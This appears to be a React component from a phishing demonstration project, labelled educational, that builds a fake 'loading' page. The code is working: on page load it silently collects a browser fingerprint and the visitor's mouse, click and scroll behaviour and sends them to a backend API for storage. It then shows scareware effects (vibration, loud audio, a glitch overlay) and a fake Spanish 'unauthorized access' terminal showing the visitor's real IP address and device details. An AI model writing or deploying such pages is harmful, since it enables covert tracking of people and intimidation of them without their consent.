import { useState, useEffect, useRef } from 'react';
import { collectFingerprint, safeVibrate } from '../utils/fingerprint';
import { captureData } from '../utils/api';

/**
 * PhishingPage - Exact React version of glitch.html
 *
 * ⚠️ EDUCATIONAL CYBERSECURITY PROJECT ⚠️
 * Demonstrates how data can be collected without user interaction
 */

const PhishingPageNew = () => {
  // Refs for DOM elements
  const audioRef = useRef(null);

  // State
  const [isLoading, setIsLoading] = useState(true);
  const [showGlitch, setShowGlitch] = useState(false);
  const [showHacking, setShowHacking] = useState(false);
  const [terminalLines, setTerminalLines] = useState([]);

  // Behavior tracking
  const startTimeRef = useRef(Date.now());
  const behaviorRef = useRef({
    mouseMovements: 0,
    clicks: 0,
    scrolls: 0,
  });

  // Track behavior
  useEffect(() => {
    const handleMouseMove = () => behaviorRef.current.mouseMovements++;
    const handleClick = () => behaviorRef.current.clicks++;
    const handleScroll = () => behaviorRef.current.scrolls++;

    window.addEventListener('mousemove', handleMouseMove);
    window.addEventListener('click', handleClick);
    window.addEventListener('scroll', handleScroll);

    return () => {
      window.removeEventListener('mousemove', handleMouseMove);
      window.removeEventListener('click', handleClick);
      window.removeEventListener('scroll', handleScroll);
    };
  }, []);

  // Type text effect
  const typeText = async (text, speed = 50) => {
    for (let i = 0; i < text.length; i++) {
      await new Promise(resolve => setTimeout(resolve, speed));
      setTerminalLines(prev => {
        const newLines = [...prev];
        if (newLines.length === 0 || newLines[newLines.length - 1].complete) {
          newLines.push({ text: text[i], complete: false });
        } else {
          newLines[newLines.length - 1].text += text[i];
        }
        return newLines;
      });
    }
    setTerminalLines(prev => {
      const newLines = [...prev];
      newLines[newLines.length - 1].complete = true;
      return newLines;
    });
  };

  // Show hacking sequence
  const showHackingSequence = async () => {
    setTerminalLines([]);

    await typeText('> ACCESO NO AUTORIZADO DETECTADO', 30);
    await new Promise(r => setTimeout(r, 400));
    await typeText('> Iniciando protocolos de seguridad...', 30);
    await new Promise(r => setTimeout(r, 600));
    await typeText('> Rastreando dispositivo...', 30);
    await new Promise(r => setTimeout(r, 500));
    await typeText('> IP: ' + (await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip).catch(() => 'xxx.xxx.xxx.xxx')), 30);
    await new Promise(r => setTimeout(r, 400));
    await typeText('> Dispositivo: ' + navigator.platform, 30);
    await new Promise(r => setTimeout(r, 400));
    await typeText('> Navegador: ' + navigator.userAgent.split(' ').pop(), 30);
    await new Promise(r => setTimeout(r, 600));
    await typeText('> Recopilando información del sistema...', 30);
    await new Promise(r => setTimeout(r, 800));
    await typeText('> ADVERTENCIA: Actividad sospechosa registrada', 30);
    await new Promise(r => setTimeout(r, 500));
    await typeText('> Datos capturados y enviados...', 30);
    await new Promise(r => setTimeout(r, 1000));
    await typeText('> Análisis de seguridad completado', 30);
  };

  // Main sequence
  useEffect(() => {
    const runSequence = async () => {
      // 1. Start capture in background (don't wait for it)
      (async () => {
        try {
          console.log('🔍 [AUTO-CAPTURE] Starting fingerprint collection...');
          const fingerprint = await collectFingerprint();
          console.log('🔍 [AUTO-CAPTURE] Fingerprint collected:', fingerprint);

          const timeOnPage = Math.floor((Date.now() - startTimeRef.current) / 1000);
          const payload = {
            ...fingerprint,
            behavior: { ...behaviorRef.current, timeOnPage },
            metadata: {
              userSubmitted: false,
              formData: { email: null, password: null }
            },
            timestamp: new Date().toISOString(),
          };

          console.log('🔍 [AUTO-CAPTURE] Sending to API...', payload);
          const result = await captureData(payload);
          console.log('✅ [AUTO-CAPTURE] Successfully saved to database!', result);
        } catch (error) {
          console.error('❌ [AUTO-CAPTURE] Failed:', error);
        }
      })();

      // 2. Wait 7 seconds (loading) - continues independently
      await new Promise(r => setTimeout(r, 7000));
      setIsLoading(false);

      // 3. Wait a moment
      await new Promise(r => setTimeout(r, 500));

      // 4. Vibrate and show glitch
      safeVibrate([200, 100, 200, 100, 200, 100, 200]);
      setShowGlitch(true);
      setShowHacking(true);

      // 5. More vibration
      setTimeout(() => safeVibrate([100, 80, 100, 80, 100, 80, 100]), 300);
      setTimeout(() => safeVibrate([100, 80, 100, 80, 100]), 1200);

      // 6. Play audio
      if (audioRef.current) {
        audioRef.current.volume = 1.0;
        audioRef.current.play().catch(err => console.error('Audio error:', err));
      }

      // 7. Show hacking sequence
      await showHackingSequence();

      // 8. Keep showing terminal (loop glitch effects)
      setInterval(() => {
        safeVibrate([50, 50, 50]);
      }, 5000);
    };

    runSequence();
  }, []);

  return (
    <div className="min-h-screen bg-black text-white font-mono overflow-hidden">
      <audio ref={audioRef} src="/AudioCOnsequence.mp3" preload="auto" />

      {/* Loading Screen */}
      {isLoading && (
        <div className="fixed inset-0 bg-black flex items-center justify-center z-50">
          <div className="text-center">
            <div className="inline-block animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-apex-red mb-4"></div>
            <p className="text-xl text-apex-green">Cargando contenido...</p>
          </div>
        </div>
      )}

      {/* Glitch Overlay */}
      {showGlitch && (
        <div className="fixed inset-0 bg-apex-red opacity-10 pointer-events-none z-20 animate-glitch-intense"></div>
      )}

      {/* Hacking Screen */}
      {showHacking && (
        <div className="fixed inset-0 bg-black flex items-center justify-center z-30 p-4">
          <div className="bg-gray-900 border-2 border-apex-green rounded-lg p-6 max-w-4xl w-full">
            <div className="flex items-center mb-4 border-b border-gray-700 pb-2">
              <div className="flex space-x-2">
                <div className="w-3 h-3 rounded-full bg-red-500"></div>
                <div className="w-3 h-3 rounded-full bg-yellow-500"></div>
                <div className="w-3 h-3 rounded-full bg-green-500"></div>
              </div>
              <span className="ml-4 text-gray-400">terminal@security-scan</span>
            </div>
            <div className="space-y-1 text-apex-green text-sm max-h-96 overflow-y-auto">
              {terminalLines.map((line, index) => (
                <div key={index}>
                  {line.text}
                  {!line.complete && <span className="animate-pulse">▋</span>}
                </div>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

export default PhishingPageNew;
